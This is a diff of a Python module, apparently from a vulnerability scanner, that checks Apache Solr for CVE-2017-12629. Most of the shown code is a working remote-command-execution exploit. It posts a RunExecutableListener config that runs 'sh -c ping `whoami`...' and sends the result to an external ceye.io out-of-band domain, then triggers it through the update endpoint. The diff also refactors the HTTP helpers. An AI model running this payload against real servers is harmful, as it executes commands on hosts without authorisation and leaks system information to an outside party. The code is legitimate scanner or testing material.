@@ -5,11 +5,8 @@ name: CVE-2017-12629漏洞
 description: CVE-2017-12629漏洞可执行任意命令
 '''
 
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2017_12629_BaseVerify:
     def __init__(self, url):
@@ -27,10 +24,7 @@ class CVE_2017_12629_BaseVerify:
                    'Connection': 'close',
                    'Content-Type': 'application/json'
                   }
-        self.capta='' 
-        self.words=''.join((string.ascii_letters,string.digits))
-        for i in range(6):
-            self.capta = self.capta + random.choice(self.words) 
+        self.capta = get_capta()
         #self.config_payload = '''{"add-listener":{"event":"postCommit","name":'%s',"class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `echo %s`.ip.port.lujuii.ceye.io"]}}''' %(self.capta, self.capta)  
         self.config_payload = '''{"add-listener":{"event":"postCommit","name":"zxlss3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `whoami`.ip.port.lujuii.ceye.io"]}}'''
         print(self.config_payload)
@@ -42,8 +36,8 @@ class CVE_2017_12629_BaseVerify:
         config_url = self.url + '/solr/demo/config'
         update_url = self.url + '/solr/demo/update'
         try:
-            config_req = requests.post(config_url, headers = self.headers, data = self.config_payload, allow_redirects = False, verify=False, timeout = 10)
-            update_req = requests.post(update_url, headers = self.headers1, data = self.update_payload, allow_redirects = False, verify=False)
+            config_req = request.post(config_url, headers = self.headers, data = self.config_payload, )
+            update_req = request.post(update_url, headers = self.headers1, data = self.update_payload)
             print('存在CVE-2017_12629漏洞')
             return True
         except Exception as e:
